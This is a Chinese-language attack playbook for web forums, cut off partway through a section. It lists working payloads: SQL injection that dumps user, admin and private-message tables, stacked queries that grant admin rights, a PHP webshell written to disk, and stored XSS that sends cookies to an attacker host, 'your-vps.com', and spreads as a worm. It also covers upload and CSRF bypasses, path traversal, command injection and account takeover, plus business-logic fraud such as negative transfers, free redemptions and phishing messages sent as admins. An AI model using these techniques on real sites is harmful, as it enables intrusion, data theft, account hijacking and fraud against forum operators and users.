一、通用 Web 漏洞 论坛定向利用（入口打点）

  1. SQL 注入漏洞 实战利用

高频注入点

帖子 ID (post_id)、板块 ID (fid/board_id)、用户 UID (uid/user_id)、帖子搜索关键词、私信 ID (msg_id)、标签 ID (tag_id)、楼层 ID (floor_id)、积分记录 ID、签到参数、用户组 ID

利用步骤 & Payload

  1. 基础注入探测
  • 常规参数闭合：?post_id=1' and 1=1--+/ ?post_id=1' and 1=2--+
  • 搜索框模糊查询闭合：keyword=技术%' and 1=1--+
  • 字段数猜解：?uid=1001 order by 6--+递增数字确定字段数
  1. 论坛核心数据脱库（MySQL）
  • 脱用户账号表：?post_id=-1 union select 1,username,password,email,phone,uid from pre_common_member--+
  • 脱管理员账号表：?fid=-1 union select 1,adminuser,adminpass,groupid from pre_ucenter_admins--+
  • 脱用户私信表：?msg_id=-1 union select 1,fromuid,touid,message,dateline from pre_ucenter_pm_messages--+
  • 脱付费内容 / 附件表：?post_id=-1 union select 1,title,content,price,file_url from pre_forum_thread--+
  1. 高阶恶意利用
  • 堆叠注入提权：?uid=1;update pre_common_member set groupid=1 where uid=1001;--（groupid=1 通常为管理员组）
  • 堆叠注入改帖：?post_id=1;update pre_forum_post set message='广告内容' where tid=10086;--
  • 写 WebShell（有权限场景）：?tid=-1 union select 1,"<?php @eval($_POST['cmd']);?>" into outfile "/var/www/html/bbs/shell.php"--+
  1. WAF 绕过技巧
  • 空格替换为/**/、%0a、%0b；双写关键字绕过；大小写混合；URL 全编码；注释符拆分关键字（sel/*xxx*/ect）
  1. XSS 漏洞 实战利用（论坛头号打点利器，管理员高触发率）

高频触发点

帖子标题、帖子正文、回帖内容、用户昵称、个性签名、头像 alt 属性、私信内容、帖子标签、举报备注、楼层回复、个人主页简介、论坛编辑器内容

利用步骤 & Payload & 绕过技巧

  1. 存储型 XSS（核心利用，可蠕虫化、打管理员）
  • 基础 Cookie 窃取：<script>document.location='http://your-vps.com/xss?c='+document.cookie</script>
  • 标签过滤绕过（论坛高频）：
  • 图片标签绕过：<img src=x onerror="document.location='http://your-vps.com/xss?c='+document.cookie">
  • UBB 代码绕过（绝大多数论坛支持）：[img=1" onerror="fetch('http://your-vps.com/xss?c='+document.cookie)"]、[url=javascript:fetch('http://your-vps.com/xss?c='+document.cookie)]点击查看[/url]
  • SVG 文件绕过：上传 svg 图片，内嵌 XSS 代码，访问即触发
  • 高阶利用
  • 管理员会话劫持：植入 Payload，管理员巡查帖子触发后，窃取管理员 Cookie，直接登录后台
  • 自动提权：JS 脚本自动调用用户组修改接口，将访问者账号提权为管理员
  • 蠕虫传播：JS 自动发帖，将 Payload 植入新帖子，访问者触发后继续传播，形成 XSS 蠕虫
  • 自动操作：自动修改用户收货地址、转发私信、刷积分、删帖、置顶广告帖
  1. 反射型 / DOM 型 XSS
  • 高频场景：搜索结果页、用户中心错误提示页、帖子跳转页
  • 利用流程：构造恶意链接http://bbs.com/search?keyword=<script>窃取Cookie脚本</script>，诱导已登录用户 / 管理员点击，触发漏洞劫持会话
  1. 通用绕过技巧
  • 大小写混合：<ScRiPt>alert(1)</ScRiPt>
  • HTML 实体编码 / Unicode 编码绕过关键字过滤
  • 拆分语句：用eval(atob('base64编码的恶意代码'))绕过关键字检测
  • 利用论坛编辑器自带功能，插入 iframe、video 标签，触发 XSS
  1. 越权访问 & 未授权访问 实战利用

水平越权（批量脱数据核心）

  1. 高频点：私信详情、用户草稿箱、他人隐藏帖子、用户充值 / 积分记录、积分商城收货地址、他人帖子编辑接口、回帖删除接口、用户关注 / 粉丝列表
  2. 利用步骤
  3. 登录自身账号，抓包正常业务请求，示例：GET /api/pm/detail?msg_id=10001、GET /api/user/draft?uid=1001
  4. 遍历修改msg_id/uid/post_id/tid/file_id参数，比如 msg_id 改为 10002、10003
  5. 重放请求，查看是否返回他人敏感数据，实现批量遍历脱库
  6. 高阶利用：POST 请求修改他人帖子内容、删除他人回帖、给他人账号禁言、修改他人收货地址
  7. 绕过技巧：同步修改 Cookie 中的 uid 和请求参数的 uid，保持一致绕过归属校验；添加Referer: http://bbs.com/user/center头绕过来源校验

垂直越权（提权拿后台核心）

  1. 高频点：版主 / 管理员删帖接口、帖子置顶 / 加精接口、用户禁言 / 封禁接口、用户组管理接口、后台用户管理接口、网站配置接口
  2. 利用步骤
  3. 普通用户登录，通过前端代码、爬虫、开源论坛默认路径获取管理员 / 版主接口，示例：/api/admin/thread/top、/api/mod/user/ban、/admin.php
  4. 直接请求该接口，查看是否能未授权调用；或抓包正常请求，添加X-Forwarded-For:127.0.0.1、X-Real-IP:127.0.0.1头，绕过本地 IP 校验
  5. 调用高危接口：给自身账号提权为管理员、置顶广告帖、批量封禁用户、修改网站配置
  6. 绕过技巧：修改请求中的groupid/is_admin参数为管理员值，绕过权限校验；伪造管理员 Referer 头，绕过来源校验

未授权访问（无门槛打点）

  1. 高频点：未登录发帖 / 回帖接口、付费帖子内容接口、VIP 附件下载接口、后台路径、swagger 接口文档、数据库备份文件、论坛统计接口、用户列表接口
  2. 利用步骤
  3. 直接浏览器访问/api/thread/add、/api/file/download?file_id=1001、/admin.php、/swagger-ui.html，无需登录，查看是否正常响应
  4. 正常请求抓包，去掉 Cookie/Token 头，重放请求，查看是否返回核心数据 / 执行操作
  5. 高阶利用：通过未授权 swagger 文档获取全量接口，批量探测高危接口；未授权访问数据库备份文件，直接脱库；未登录批量发广告帖
  6. 文件上传漏洞 实战利用

高频上传点

用户头像上传、帖子附件上传、个性签名图片上传、举报凭证上传、用户实名认证资质上传、编辑器图片 / 文件上传

利用步骤 & 绕过技巧

  1. 基础利用：直接上传 php 一句话木马，后缀使用php、php5、phtml、php3、phar
  2. 论坛专属绕过技巧
  • 后缀绕过：双后缀php.jpg、大小写shell.PHP、特殊字符shell.php.、shell.php%00.jpg、Windows 环境shell.php::$DATA
  • 内容校验绕过：文件头添加GIF89a，木马内容写在图片末尾，制作图片马；修改文件 Content-Type 为image/jpeg，绕过 MIME 类型校验
  • 编辑器漏洞利用：针对 Discuz!、UEditor、CKEditor 等论坛常用编辑器，直接使用已知历史上传漏洞 exp，一键 getshell
  • 条件竞争利用：Burp 并发上传 + 并发访问临时文件，在服务器删除临时文件前触发木马执行
  • 解压漏洞利用：上传带软链接 / 木马文件的 zip 压缩包，利用论坛附件解压功能，读取服务器配置文件 / 写入 WebShell
  1. 高阶利用：上传.htaccess文件，设置 jpg 文件解析为 php，再上传图片马；通过上传的 webshell 提权，接管论坛服务器
  2. CSRF 漏洞 实战利用

高频触发点

修改用户密码 / 绑定邮箱 / 手机、发帖 / 回帖、举报用户 / 帖子、关注用户、积分兑换、打赏、版主删帖 / 禁言 / 置顶、管理员修改用户组

利用步骤

  1. 抓包正常业务 POST 请求，示例：POST /api/user/password/change，参数old_pass=xxx&new_pass=xxx
  2. 构造 CSRF 自动提交页面，诱导已登录的用户 / 管理员访问
  3. 核心利用场景：诱导管理员访问，自动将攻击者账号提权为管理员；诱导用户访问，自动修改收货地址、转发私信、给广告帖点赞顶帖；诱导版主访问，自动删帖 / 禁言目标用户
  4. GET 型 CSRF 一键触发：<img src="http://bbs.com/api/mod/user/ban?uid=10086">，用户访问页面即触发对目标用户的禁言操作
  5. 其他通用漏洞 论坛定向利用
  6. 目录遍历 / 任意文件读取
  • 高频点：附件下载接口、模板加载接口、图片预览接口
  • 利用 Payload：/api/file/download?filename=../etc/passwd、/api/template?name=../config.php，遍历读取服务器配置文件、数据库账号密码
  1. 敏感信息泄露
  • 利用点：txt 泄露后台路径、错误页面泄露服务器路径 / 数据库版本、前端代码泄露 API 密钥 / 加密盐、接口明文返回用户邮箱 / 手机号 / 密码哈希、网站备份文件（wwwroot.rar、bbs.sql、backup.zip）可直接下载
  1. 命令注入
  • 高频点：论坛数据库备份功能、ping 检测功能、图片处理功能、日志清理功能
  • 利用 Payload：?backup_name=test;id;、?ip=127.0.0.1|whoami|，执行系统命令，接管服务器

二、论坛专属业务逻辑漏洞 核心利用（绕 WAF，无特征，渗透核心重点）

  1. 用户账号与认证模块 漏洞利用

任意用户账号接管

  1. 密码重置全场景利用
  • 验证码响应包回显：忘记密码→输入目标手机号→获取验证码→抓包查看响应包，提取明文返回的验证码→重置目标用户密码
  • 验证码无限制爆破：抓包重置密码接口，对 4-6 位数字验证码进行爆破，每次请求更换X-Forwarded-For头绕过 IP 限制，跑出正确验证码重置密码
  • 重置环节 UID 可控：自身账号走重置流程→最后一步设置新密码抓包→修改请求中uid/user_id为目标用户 UID→提交请求，直接重置目标密码，无需验证码
  • 邮箱 / 手机绑定篡改：抓包绑定邮箱 / 手机接口→修改uid为目标用户 UID→将自己的邮箱 / 手机绑定到目标账号→通过忘记密码接管账号
  1. 登录绕过 & 账号伪造
  • Cookie 伪造：老论坛 Cookie 中的uid/username无签名校验，直接修改 Cookie 中的 uid 为目标用户 ID，无需密码直接登录
  • 万能密码登录：登录接口存在 SQL 注入，使用 Payload ' or 1=1--+作为密码，直接登录管理员账号
  • 重复注册绕过：注册时用户名添加空格、特殊字符、Unicode 不可见字符，注册与管理员 / 官方同名的账号，用于钓鱼
  1. 批量注册 & 封禁绕过
  • 批量注册：注册接口无频率限制、验证码前端可控，配合接码平台批量注册小号，用于刷帖、顶帖、刷积分、广告引流
  • 账号封禁 / 禁言绕过：抓包修改请求 UA/IP、更换小号 session，绕过封禁；封禁后仍能调用私信、附件下载接口，绕过权限限制
  1. 帖子与内容管理模块 漏洞利用（论坛核心业务）

内容权限绕过 & 越权操作

  1. 隐藏 / 付费内容绕过
  • 回复可见绕过：抓包帖子内容接口，修改is_reply参数为 1，无需回帖直接查看隐藏内容；或抓包回帖接口，修改tid为目标帖子 ID，无需实际回帖绕过限制
  • 登录可见 / 付费可见绕过：去掉 Cookie 重放帖子内容请求，直接获取未登录可见内容；修改请求中pay_status/is_pay参数为 1，无需付费直接查看付费帖子 / 下载付费附件
  • 私密板块绕过：抓包帖子详情接口，修改fid/board_id为私密板块 ID，直接访问板块内的帖子内容
  1. 帖子越权操作
  • 篡改他人帖子：抓包编辑帖子接口，修改post_id/tid为他人帖子 ID，直接修改帖子内容，插入广告 / 违规内容
  • 删帖 / 置顶 / 加精越权：抓包版主删帖 / 置顶 / 加精接口，普通用户直接调用，对任意帖子执行操作；修改board_id参数，跨板块执行版主操作
  • 举报滥用：举报接口无频率限制，批量举报目标帖子，触发论坛自动审核机制，导致帖子被下架 / 删除

发帖 / 回帖逻辑漏洞

  1. 无限制刷帖 / 顶帖：发帖 / 回帖 / 点赞接口无频率限制，批量发广告帖、水帖；批量刷点赞 / 浏览量，把帖子顶到首页热帖
  2. 敏感词绕过：用同音字、Unicode 编码、HTML 实体、拆分字、特殊字符间隔，绕过论坛敏感词过滤，发布广告 / 违规内容
  3. 匿名发帖 / 定时帖绕过：抓包发帖接口，修改is_anonymous为 1，无需权限匿名发帖；修改post_time参数，提前发布定时帖子
  4. 楼层篡改：回帖抓包修改floor_id参数，抢占沙发 / 置顶楼层，甚至覆盖他人回帖内容
  5. 用户权限与用户组模块 漏洞利用（提权核心）
  6. 越权提权
  • 注册提权：抓包注册接口，修改groupid/user_group参数为管理员组 ID，直接注册管理员账号
  • 用户组修改越权：抓包用户组兑换 / 修改接口，修改uid为自身账号 ID、groupid为管理员组 ID，直接提权为管理员 / 版主
  • VIP 权限绕过：抓包访问 VIP 内容接口，修改is_vip/vip_level参数为最高级，vip_expire_time为永久时间，无需开通会员直接访问所有 VIP 内容
  1. 权限扩大绕过
  • 版主权限越界：普通版主抓包修改board_id/fid参数，跨板块管理帖子，甚至管理全站内容；调用管理员用户管理接口，禁言 / 封禁用户、修改用户组
  • 身份伪造：抓包用户信息接口，修改is_verify/is_official参数为 1，无需认证直接显示实名认证 / 官方认证标识，用于钓鱼
  1. 权限校验遗漏：论坛仅校验用户是否登录，不校验用户组 / 权限，普通用户可直接调用所有管理接口，实现全站操作权限
  2. 积分与虚拟货币模块 漏洞利用（薅羊毛重灾区）
  3. 无限刷取积分 / 虚拟币
  • 签到刷分：抓包签到接口，并发发送请求，无幂等性控制即可重复签到，无限刷积分
  • 行为刷分：发帖 / 回帖 / 关注 / 点赞获取积分，无限制刷操作，积分不设上限；回帖 / 删帖后积分不回收，循环刷分
  • 邀请刷分：抓包邀请注册接口，配合接码平台批量注册小号，自己邀请自己，无限刷取邀请积分 / 返利
  • 负值充值：抓包充值接口，修改充值金额为负数，提交后账号余额 / 虚拟币异常增加
  1. 积分 / 货币规则绕过
  • 兑换篡改：抓包积分商城兑换接口，修改商品价格 / 所需积分为 01/0，0 元兑换实物 / 虚拟商品 / VIP 会员
  • 汇率篡改：抓包积分转虚拟币接口，修改兑换汇率，1 积分兑换大额虚拟币
  • 转账漏洞：抓包用户转账接口，修改转账金额为负数，对方账号扣减余额，自身账号余额增加
  • 超卖漏洞：限购商品兑换接口，并发发送请求，无原子性库存控制，实现限购商品无限兑换
  1. 退款漏洞：购买付费内容 / 商品后申请退款，抓包修改退款金额大于实付金额，实现超额退款；退款后内容权限 / 商品不回收，循环退款刷取权益
  2. 私信与社交模块 漏洞利用
  3. 私信越权泄露：抓包私信详情接口，遍历修改msg_id/from_uid/to_uid参数，批量查看任意用户之间的私信内容，脱取全站私信数据
  4. 私信伪造 & 骚扰：抓包私信发送接口，修改from_uid为管理员 / 官方账号，给用户发送钓鱼私信，诱导泄露账号密码；私信接口无频率限制，批量给全站用户发广告 / 骚扰信息

  6. 付费与变现模块 漏洞利用
  7. 付费内容全场景绕过
  • 付费帖子 / 视频 / 附件：抓包内容获取 / 附件下载接口，修改pay_status为 1，无需付费直接查看 / 下载；遍历file_id参数，批量下载全站付费附件
  • 会员内容绕过：抓包用户信息接口，修改会员等级、到期时间参数，永久解锁全站会员内容；抓包会员内容接口，直接请求获取内容，无权限校验
  1. 付费功能漏洞
